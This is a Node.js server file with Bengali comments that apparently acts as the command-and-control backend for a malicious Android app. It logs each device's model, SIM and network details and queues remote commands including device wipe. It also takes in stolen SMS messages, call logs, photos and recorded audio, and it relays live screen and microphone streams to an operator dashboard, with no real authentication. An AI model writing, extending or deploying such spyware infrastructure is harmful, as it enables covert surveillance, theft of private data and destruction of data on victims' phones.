const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 // ১০০ মেগাবাইট পর্যন্ত ফাইল/ফ্রেম সাপোর্ট
});

const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '100mb' }));

let devices = {}; 

// --- APK Connectivity API ---

// ১. হার্টবিট এবং কমান্ড আদান-প্রদান (সব ফিচারের কমান্ড রুট)
app.post('/api/ping', (req, res) => {
    const { deviceId, status } = req.body;
    if (deviceId) {
        if (!devices[deviceId]) devices[deviceId] = { commands: [], lastSeen: '' };
        devices[deviceId].info = status; // Model, Battery, SIM Info, Network, etc.
        devices[deviceId].lastSeen = new Date().toLocaleTimeString();
        
        // ড্যাশবোর্ডে লাইভ আপডেট পাঠানো
        io.emit('update_list', { deviceId, ...devices[deviceId] });
        
        // অ্যাপের জন্য পেন্ডিং কমান্ড (Wipe, TTS, Vibrate, etc.) পাঠানো
        const cmdToSend = devices[deviceId].commands.splice(0);
        res.json({ commands: cmdToSend });
    } else res.status(400).send();
});

// ২. ডিপ ডাটা এবং ফাইল আপলোড (SMS, Call Logs, Photos, Recorded Audio)
app.post('/api/upload', (req, res) => {
    const { deviceId, type, data, fileName } = req.body;
    
    // ড্যাশবোর্ডের স্পেসিফিক মডিউলে ডাটা পাঠানো
    io.emit('new_incoming_data', { deviceId, type, data, fileName });
    
    console.log(`[ALERTER] ${type} received from ${deviceId}`);
    res.json({ status: 'success' });
});

// ৩. লাইভ স্ক্রিন মিররিং এবং মাইক্রোফোন স্ট্রিমিং
app.post('/api/stream', (req, res) => {
    const { deviceId, streamType, buffer } = req.body;
    // সরাসরি ড্যাশবোর্ড স্ক্রিনে পুশ করা
    io.emit('live_stream', { deviceId, streamType, buffer });
    res.status(200).send();
});

// --- Dashboard Control Logic ---
io.on('connection', (socket) => {
    console.log('Admin Authenticated');

    socket.on('send_cmd', ({ id, cmd, payload }) => {
        if (devices[id]) {
            // ২০টি ফিচারের যেকোনো কমান্ড কিউতে রাখা
            devices[id].commands.push({ action: cmd, ...payload });
            console.log(`[CONTROL] ${cmd} assigned to ${id}`);
        }
    });

    // সরাসরি মিররিং ফ্রেম রিসিভ করা (Socket এর মাধ্যমে)
    socket.on('screen_frame', (data) => {
        socket.broadcast.emit('display_frame', data);
    });
});

server.listen(PORT, () => console.log(`SYSTEM MASTER SERVER ACTIVE: PORT ${PORT}`));
